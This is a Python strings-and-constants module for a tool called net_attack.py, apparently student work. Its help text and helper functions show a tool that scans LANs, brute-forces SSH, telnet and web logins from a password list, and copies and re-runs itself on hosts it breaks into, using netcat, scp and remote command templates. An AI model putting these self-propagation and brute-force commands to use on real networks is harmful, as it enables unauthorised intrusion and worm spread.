#!/usr/bin/python3

"""
===PLEASE READ===
String functions and constants are organised alphabetically. Every string
function has a block comment explaining what it does and where it's used and
every string constant has a comment describing its use.
"""

# Argument to denote the filename of the IP address file.
ARGUMENT_IP_ADDRESS_FILENAME = "-t"

# Argument to denote the set of ports to use.
ARGUMENT_PORTS = "-p"

# Argument to denote the username for each of the actions.
ARGUMENT_USERNAME = "-u"

# Argument to denote the filename of the passwords file.
ARGUMENT_PWS_FILENAME = "-f"

# Argument to denote the need to propagate the running script.
ARGUMENT_PROPAGATE = "-P"

# Argument to denote the need to scan the local network.
ARGUMENT_SCAN_LOCAL_NETWORKS = "-L"

# Argument to denote the use of a specific file given the filename propagation.
ARGUMENT_SPECIFIC_PROPAGATION_FILE = "-d"

# Argument to denote the need for further help.
ARGUMENT_HELP_SHORT = "-h"

# Argument to denote the need for further help, just the long version.
ARGUMENT_HELP_LONG = "--help"

#
ASSIGNING_ARGUMENTS = "Assigning arguments as part of test"

# Blank IP addresses, mostly for test purposes.
BLANK_IP = "0.0.0.0"

# Just a blank string, no point assigning multiple of these to memory. :)
BLANK_STRING = ""

# A string that states that the IP and port pair is closed.
CLOSED_IP_PORT_PAIR = "This IP address and port pair is closed"

# A string that just denotes the use of a colon, same "idea" as above.
COLON = ":"

# A string that just denotes the use of a comma, same "idea" as above.
COMMA = ","

# A string that states a script wasn't propagated.
DO_NOT_PROPAGATE = "Requirement to propagate script not specified, skipping..."

# A string that states a file wasn't transferred.
DO_NOT_TRANSFER = "Requirement to transfer file not specified, skipping..."

# A string for specifying encoding for ascii.
ENCODE_ASCII = "ascii"

# An exiting prompt.
EXITING = "Exiting..."

# Prompts the user that values couldn't be assigned
FAILED_ASSIGNING_VALUES = "Failed assigning values (maybe null)"

# Prompts the user that their fetching the local interface list.
FETCHING_LOCAL_INTERFACE_LIST = "Fetching local interface list..."

# Lets the user know a file doesn't exist.
FILE_DOES_NOT_EXIST = "A specified file does not exist"

# Lets the user know there's an open port on a specific IP address.
FOUND_OPEN_IP_PORT_PAIR = "Found an open IP address and port pair"

# Full stop string, memory saving again, reducing redundant assigns.
FULL_STOP = "."

# There's a problem with parsing a file with a given filename.
FILENAME_PROCESSING_ERROR = "One of the filenames are invalid"

# Letting the user know a propagation action had failed.
IMPOSSIBLE_ACTION = "It was impossible to bruteforce this IP address and port"

# The login prompt a user usually sees with SSH/Telnet.
LOGIN_PROMPT = "login:"

# The typical ID of the loopback interface.
LOOPBACK = "lo"

# The main function call.
MAIN = "main()"

# Just the numerical form of the number one, again, memory preservation.
ONE = "1"

# Password prompt for SSH/Telnet.
PASSWORD_PROMPT = "Password:"

# Password prompt for web logins, rather the post ID really.
PASSWORD_PROMPT_WEB = "password:"

# TODO: The way passwords are handled needs to be heavily revised
#  (super insecure)
# The default password file being used by scripts.
PASSWORDS_FILE = "passwords.txt"

# Parameters were used incorrectly, so we're telling the user what to do.
PARAMETER_MISUSE = "Parameter misuse, check help text below"

# Letting the user know we're performing a local scan.
PERFORMING_LOCAL_SCAN = "Performing local scan, this might take a while so " \
                        "grab a coffee..."

# The ping command.
PING = "ping"

# The argument for ping which specifies the number of packets sent.
PING_ARGUMENT = "-c"

# TODO: On top of moving this prompt to UI, there should be no difference in
#  the prompt, avoid confusion.
# A different password prompt following the previous one.
RSA_PROMPT_AGAIN = "Please type in this password again: "

# The help prompt for the end user.
PLS_HELP = "Parameters:\n\t" + ARGUMENT_IP_ADDRESS_FILENAME + \
           " -> Filename for a file containing a list of " \
           "target IP addresses\n\t" + ARGUMENT_PORTS + \
           " -> Ports to scan on the target host" \
           "\n\t" + ARGUMENT_USERNAME + " -> A username\n\t" + \
           ARGUMENT_PWS_FILENAME + \
           " -> Filename for a file containing " \
           "a list of passwords\n\t" + ARGUMENT_SCAN_LOCAL_NETWORKS + \
           " -> Scans the lan across all " \
           "interfaces and creates/adds to the list of target IP addresses" \
           "\n\t" + ARGUMENT_PROPAGATE + \
           " -> Propagates the script onto available devices and " \
           "executes the script using the given command\nExample usage:\n" \
           "\t./net_attack.py " + ARGUMENT_IP_ADDRESS_FILENAME + \
           " my_ip_list.txt " + ARGUMENT_PORTS + " 22,23,25,80 " + \
           ARGUMENT_USERNAME + " admin " \
           + ARGUMENT_PWS_FILENAME + \
           " my_password_list.txt\n\n\t./net_attack.py " + \
           ARGUMENT_IP_ADDRESS_FILENAME + " ip_list.txt " \
           + ARGUMENT_PORTS + " 22 " + ARGUMENT_USERNAME + " root " + \
           ARGUMENT_PWS_FILENAME + " passwords.txt"

# Newline character, mostly used to mimic an enter key press.
RETURN_OR_NEWLINE = "\n"

# RSA specific password prompt.
RSA_AND_PROMPT = "Please type in this password below and say yes to any " \
                 "RSA key prompts: "

# Specifies that the script has been propagated over a port (use debug for
# specific port number).
SCRIPT_PROPAGATED = "Script propagated over this port"

# Specifies that the script hasn't been propagated over a port.
SCRIPT_NOT_PROPAGATED = "Script couldn't be propagated over this port"

# Just an SSH strings, memory saving measures again.
SSH = "SSH"

# Same as above just lowercase, needed in some instances.
SSH_LOWERCASE = "ssh"

# The default port for SSH.
SSH_PORT = "22"

# Station an action was successful.
SUCCESSFUL = "Successful"

# The syn flag for packet crafting in Scapy
SYN_FLAG = "S"

# Telnet string for service definitions and actions.
TELNET = "telnet"

# The default port for the telnet service.
TELNET_PORT = "23"

# A stringing just for tests.
TEST = "tests"

# Name of the test text file, prepended with src/ for Pytest to work.
TEST_FILENAME = "src/test_file.txt"

# Lines to check from the test file.
TEST_LINES = ["Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed "
              "do eiusmod tempor", "incididunt ut labore et dolore magna "
                                   "aliqua. Ut enim ad minim veniam, quis",
              "nostrud exercitation ullamco laboris nisi ut aliquip ex ea "
              "commodo consequat.", "Duis aute irure dolor in reprehenderit "
                                    "in voluptate velit esse cillum dolore",
              "eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non"
              " proident, sunt", "in culpa qui officia deserunt mollit anim id"
                                 " est laborum."]
# Arguments to check and test. Essentially example usages.
TEST_ARGUMENTS_SET_ONE = ["-t", "test_ip_list.txt", "-p", "22,23,25,80", "-u", "admin", "-f", "my_password_list.txt"]
TEST_ARGUMENTS_SET_TWO = ["-t", "ip_list.txt", "-p", "22,23,25,80", "-u", "admin", "-f", "my_password_list.txt"]
TEST_ARGUMENTS_SET_THREE = ["-t", "test_ip_list.txt", "-p", "22,23,25,80", "-u", "admin", "-f", "my_password_list.txt"]
TEST_ARGUMENTS_SET_FOUR = ["-t", "test_ip_list.txt", "-p", "22,23,25,80", "-u", "admin", "-f", "my_password_list.txt"]

# Letting the user know an IP address and port pair is being tested. Again,
# use the debug tools in your IDE of choice to see the specific values.
TESTING_IP_PORT_PAIR = "Now testing an IP address and port pair..."

# Letting the user know a file couldn't be transferred over telnet or SSH
# default ports.
TRANSFER_FAILURE_SSH_TELNET = "File couldn't be transferred over port 22 or 23"

# Letting the user know a file could be transferred over telnet or SSH
# default ports.
TRANSFER_SUCCESS_SSH_TELNET = "File transferred over port 22 or 23"

# Unsuccessful statement to be used with services and actions.
UNSUCCESSFUL = "Unsuccessful"

# The username prompt that comes with web login POST requests.
USERNAME_PROMPT_WEB = "username:"

# Just a web string to define services and actions.
WEB = "web"

# Just a web login string to define services and actions.
WEB_LOGIN = "web login"

# Port 80 for web services.
WEB_PORT_EIGHTY = "80"

# Port 8080 for web services.
WEB_PORT_EIGHTY_EIGHTY = "8080"

# Port 8888 for web services.
WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT = "8888"

# Welcome to string, used for a lot of the prompts.
WELCOME_TO = "Welcome to"


def adding_address_to_interface(specific_address, interface):
    """
    This function takes a specific address and an interface and generates a
    string for declaring it was found in a given subnet
    :param specific_address: The specific target address to be added to the
    interface
    :param interface: The interface on which we're adding a specific target
    address
    :return "Adding " + str(specific_address) + " from interface "
    + str(interface) + "'s subnet.": The string in question
    """
    return "Adding " + str(specific_address) + " from interface " \
           + str(interface) + "'s subnet."


def cat_file(filename):
    """
    This function creates a command for concatenating a specific file
    :param filename: The filename of the file we want to touch
    :return "cat " + filename: The completed cat command
    """
    return "cat " + filename


def checking_ip_reachable(ip):
    """
    This function creates a string that describes the availability of a machine
    on a specific IP address
    :param ip: The specific IP address
    :return "Checking if the following ip address is reachable: " + str(ip):
    The string in question
    """
    return "Checking if the following ip address is reachable: " + str(ip)


def connection_status(service, ip, port, status):
    """
    This function creates the connection status string dependent
    on the context given by the arguments passed into it.
    """
    string = str(status) + " " + str(service) + " login to " + str(ip) + ":" \
        + str(port) \
        + " using the specified username with a password in the " \
          "passwords file."
    return string


def fetching_ips_for_interface(interface):
    """
    This function generates the string for fetching the IPs for a specific
    interface
    :param interface: The interface we're fetching IPs on
    :return "Fetching IPs for interface " + str(interface) + "...": The string
    in question
    """
    return "Fetching IPs for interface " + str(interface) + "..."


def file_present_on_host(ip):
    """
    This function generates the string for a file already present on a host
    :param ip: The host itself
    :return "A file is already present on this host: " + str(ip): The string
    in question
    """
    return "A file is already present on this host: " + str(ip)


def scp_command_string(port, username, target_ip, filename):
    """
    This function creates and SSH copy string for an OS command
    :param port: Port over which we are running the SSH copy
    :param username: The username for the SSH login
    :param target_ip: The IP address of the machine we are copying too
    :param filename: The name of the file to be copied across by SSH
    :return "scp -P " + str(port) + " " + filename + " " + username + "@" \
           + target_ip + ":~/": The SSH copy command
    """
    return "scp -P " + str(port) + " " + filename + " " + username + "@" \
           + target_ip + ":~/"


def touch_file(filename):
    """
    This function creates a command for touching a specific file
    :param filename: The filename of the file we want to touch
    :return command: The completed touch command
    """
    command = "touch " + filename
    return command


def ip_list_not_read(filename):
    """
    This function returns the error for an ip list that can't be generated from
    a particular filename
    :param filename: The filename of the file that can't have an ip list
    derived from it
    :return "IP list cannot be read from filename: " + filename: The string in
    question
    """
    return "IP list cannot be read from filename: " + filename


def ip_reachability(ip, reachable):
    """
    This function generates the string regarding the reachability of an IP i.e.
    whether it can be pinged
    :param ip: The IP being pinged
    :param reachable: Whether it is reachable
    :return str(ip) + " was reachable.": String returned if it is reachable
    :return str(ip) + " was not reachable.": String returned if it is not
    reachable
    """
    if reachable:
        return str(ip) + " was reachable."
    return str(ip) + " was not reachable."


def netcat_listener(port, filename):
    """
    This function will create a netcat listener on the device we have a telnet
    link to
    :param port: The port on which the telnet listener will operate
    :param filename: The filename of the file we're moving using the listener
    parameter
    :return "nc -l -p " + str(port) + " > " + filename: The string in question
    """
    return "nc -l -p " + str(port) + " > " + filename


def netcat_writer(ip, port, filename):
    """
    This function will create a netcat writer to write a file to a device we
    have a telnet link to
    :param ip: Machine with the telnet listener we are writing to
    :param port: The port on which the telnet writer will operate
    :param filename: The filename of the file we're moving using the writer
    parameter
    :return "nc -w 3 " + str(ip) + " " + str(port) + " < " + filename: The
    string in question
    """
    return "nc -w 3 " + str(ip) + " " + str(port) + " < " + filename


def run_script_command(filename, username):
    """
    This function will run the propagation script on another target machine
    over any service
    :param filename: The file that holds the propagation script
    :param username: The username to run against the propagation script as a
    parameter
    :return "net_attack.py -L -p 22,23 -u " + username + " -f passwords.txt
    -P": The command itself
    """
    return filename + " -L -p 22,23 -u " + username + " -f passwords.txt -P"


def web_login_url(ip, port):
    """
    This function will build the web login url string
    :param ip: The IP of the machine running the web service
    :param port: The port the web service is running on
    :return "https://" + ip + ":" + port + "/login.php": The string itself
    """
    return "https://" + ip + ":" + port + "/login.php"


def working_username_password(service):
    """
    This function will build a string for a working username and password given
     a specific service
    :param service: Service for which there is a working username and password
    combination
    :return "A working username and password for " + str(service) +
    " was found.": The string itself
    """
    return "A working username and password for " + str(service) + \
           " was found."
